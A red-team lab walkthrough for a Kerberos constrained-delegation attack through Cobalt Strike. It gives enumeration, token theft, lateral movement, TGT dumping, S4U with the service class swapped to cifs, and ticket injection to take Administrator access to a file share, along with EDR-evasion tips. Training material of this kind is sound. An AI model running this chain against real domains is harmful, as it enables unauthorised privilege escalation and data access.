# Constrained Delegation with Service Name Substitution Kerberos Lab

>The objective of this lab is to abuse constrained delegation using an alternate service name.

**Concept:** When constrained delegation is configured for a non-CIFS service (e.g. `time/lon-fs-1`), a service ticket for that SPN can have its service class swapped in the unencrypted portion of the ticket (e.g. `time` → `cifs`). The target server only validates the encrypted portion — it never checks the SPN in the unencrypted PAC — so the substituted ticket is accepted. This turns a restricted delegation into full file system access without needing CIFS in `msDS-AllowedToDelegateTo`.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Find constrained delegation targets — note the value in `msDS-AllowedToDelegateTo` (e.g. `time/lon-fs-1`). You will need the exact SPN in the exploitation step.  

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
    ```

    > `OPSEC-SAFE` — BOF, runs in beacon thread, no child process.

⚠️ Expected output: `lon-ws-1$` with `msDS-AllowedToDelegateTo: time/lon-fs-1`. The service is `time`, not `cifs` — that is the point of this lab.

===

## Lateral Movement to lon-ws-1

Goal: get a beacon running as SYSTEM on `lon-ws-1` so we can access the machine account logon session (LUID `0x3e7`) and dump its TGT.

1. On the existing beacon, open the process browser and find a process owned by `rsteel` (or any domain user with local admin on `lon-ws-1`):

    ```Beacon-nocolor
    process_browser
    ```

2. Steal the token of that process:

    ```Beacon-nocolor
    steal_token <pid>
    ```

    > `OPSEC-SAFE` — token impersonation in beacon thread, no process spawn.

3. Set spawnto before jumping to avoid default `rundll32.exe` child process.
   `ak-settings` is the Aggressor Kit command loaded in the CRTO lab environment:

    ```Beacon-nocolor
    ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    ```

    Equivalent standard CS command (if Aggressor Kit is not loaded):

    ```Beacon-nocolor
    spawnto x64 %windir%\sysnative\dllhost.exe
    ```

    > `OPSEC-CAUTION` — sets the sacrificial process for any subsequent fork & run commands. `dllhost.exe` is preferred over `svchost.exe` as it is a common host for COM surrogate processes and blends better with normal system activity.

4. Move laterally to `lon-ws-1` — prefer WinRM, fall back to scshell if WinRM is blocked:

    ```Beacon-nocolor
    # OPSEC-SAFE (preferred) — WinRM, no service modification, no disk write on target
    
    jump winrm64 lon-ws-1 smb

    # OPSEC-CAUTION (fallback) — SCShell modifies existing service ImagePath via SCM
    # Generates: Event 7040 (service config changed), 4697, 4688
    
    jump scshell64 lon-ws-1 smb
    ```

5. Interact with the new beacon on `lon-ws-1`. Verify running as SYSTEM:

    ```Beacon-nocolor
    getuid
    ```

===

## Exploitation

### Step 1 — Dump the machine account TGT

LUID `0x3e7` is the machine account logon session — always present on any domain-joined host, always SYSTEM-accessible.

```Beacon-nocolor
krb_dump /luid:3e7 /service:krbtgt
```

> `OPSEC-CAUTION` — BOF (no child process). Uses `LsaCallAuthenticationPackage` Kerberos API, not a raw LSASS memory read. EDR hooks on this API call will still fire.

⚠️ Copy the entire base64 TGT output — you pass it to `krb_s4u` in the next step.

Optionally verify the ticket before using it:

```Beacon-nocolor
krb_describe /ticket:[base64-TGT]
```

> `OPSEC-SAFE` — BOF, read-only ticket inspection.

---

### Step 2 — S4U abuse with service name substitution

Use the machine TGT to request a service ticket for the delegated SPN (`time/lon-fs-1`), then substitute the service class to `cifs`. The resulting ticket is valid for `cifs/lon-fs-1` impersonating Administrator.

```Beacon-nocolor
krb_s4u /ticket:[base64-TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

> `OPSEC-SAFE` — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.

⚠️ `/service:time/lon-fs-1` must exactly match the value in `msDS-AllowedToDelegateTo` from enumeration — if the delegation target is different in your lab, substitute accordingly.

⚠️ `/altservice:cifs` replaces the service class in the unencrypted ticket header. The KDC-signed encrypted portion is unchanged — the target host accepts it.

⚠️ `krb_s4u` outputs a base64-encoded service ticket. Copy the full base64 string from the beacon output — you need it in Step 3.

---

### Step 3 — Save the service ticket on the attacker machine

Run this on the attacker CS client (local PowerShell — **not** via beacon):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
```

> The `.kirbi` file is written to your **attacker desktop only** — nothing touches the target's disk. `kerberos_ticket_use` reads from the CS client and injects over the C2 channel.

---

### Step 4 — Inject the ticket and access the share

Back in the beacon on `lon-ws-1`:

```Beacon-nocolor
make_token CONTOSO\Administrator FakePass!
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
ls \\lon-fs-1\c$
```

> `OPSEC-SAFE` — `make_token` creates a sacrificial logon session in-memory. `kerberos_ticket_use` injects the ticket into it — no disk write on target, no child process.

⚠️ `ls \\lon-fs-1\c$` should succeed. If it fails with `ACCESS_DENIED`, verify:
- `getuid` — confirm token is set
- `run klist` — confirm the `cifs/lon-fs-1` ticket is present in the session
- The SPN in `krb_s4u` exactly matches what ldapsearch returned

Drop impersonation when done:

```Beacon-nocolor
rev2self
```

===

⚠️ In this lab, you abused constrained delegation with service name substitution — taking a delegation configured only for `time/lon-fs-1` and turning it into a usable `cifs/lon-fs-1` ticket impersonating a Domain Admin, without ever touching LSASS directly or requiring the Administrator's credentials.
